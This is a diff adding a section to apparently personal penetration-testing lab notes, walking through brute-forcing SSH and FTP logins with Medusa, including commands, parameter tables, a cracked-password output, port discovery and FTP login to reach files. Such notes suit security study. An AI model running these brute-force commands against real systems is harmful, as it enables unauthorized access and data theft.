@@ -558,6 +558,98 @@ medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name
 
 ---
 
+# Web Services
+
+## **Introduction**  
+In cybersecurity, robust authentication is crucial to prevent unauthorized access. Weak passwords can leave services like **SSH** and **FTP** vulnerable to brute-force attacks. This module demonstrates how attackers use **Medusa**, a brute-forcing tool, to compromise SSH and FTP services, emphasizing the need for strong authentication practices.  
+
+
+## **1. Understanding SSH & FTP Security**  
+
+### **Secure Shell (SSH)**  
+- **Purpose**: Secure remote login, command execution, and file transfers.  
+- **Security Feature**: Encrypted communication (unlike Telnet).  
+- **Vulnerability**: Weak or guessable passwords make SSH susceptible to brute-force attacks.  
+
+### **File Transfer Protocol (FTP)**  
+- **Purpose**: Transfers files between a client and a server.  
+- **Vulnerability**: Standard FTP transmits **credentials in plaintext**, making it prone to interception and brute-force attacks.  
+
+## **2. Brute-Forcing SSH Authentication using Medusa**  
+
+### **Executing a Brute-Force Attack**  
+```bash
+medusa -h <IP> -n <PORT> -u sshuser -P 2023-200_most_used_passwords.txt -M ssh -t 3
+```
+### **Command Breakdown**  
+| Parameter | Description |
+|-----------|-------------|
+| `-h <IP>` | Target system's IP address |
+| `-n <PORT>` | SSH service port (default: 22) |
+| `-u sshuser` | Username for authentication |
+| `-P 2023-200_most_used_passwords.txt` | Password wordlist |
+| `-M ssh` | Specifies SSH module in Medusa |
+| `-t 3` | Number of parallel login attempts |
+
+### **Output (Successful Attack)**  
+```bash
+ACCOUNT FOUND: [ssh] Host: <IP> User: sshuser Password: 1q2w3e4r5t [SUCCESS]
+```
+### **Establishing SSH Access**  
+```bash
+ssh sshuser@<IP> -p <PORT>
+```
+
+## **3. Expanding the Attack - Identifying Additional Services**  
+
+### **Scanning Open Ports using `netstat`**  
+```bash
+netstat -tulpn | grep LISTEN
+```
+**Findings:**  
+- Port **22** → SSH  
+- Port **21** → FTP  
+
+### **Confirming with `nmap` Scan**  
+```bash
+nmap localhost
+```
+**Output:**  
+```
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+```
+
+
+## **4. Brute-Forcing FTP Authentication using Medusa**  
+
+### **Executing a Brute-Force Attack**  
+```bash
+medusa -h 127.0.0.1 -u ftpuser -P 2020-200_most_used_passwords.txt -M ftp -t 5
+```
+### **Command Breakdown**  
+| Parameter | Description |
+|-----------|-------------|
+| `-h 127.0.0.1` | Target local FTP server |
+| `-u ftpuser` | Username for authentication |
+| `-P 2020-200_most_used_passwords.txt` | Password wordlist |
+| `-M ftp` | Specifies FTP module in Medusa |
+| `-t 5` | Number of parallel login attempts |
+
+
+## **5. Retrieving Sensitive Data via FTP**  
+
+### **Logging into FTP Server**  
+```bash
+ftp ftp://ftpuser:<PASSWORD>@localhost
+```
+### **Listing Files in FTP Directory**  
+```bash
+ls
+```
+
+
 
 
 
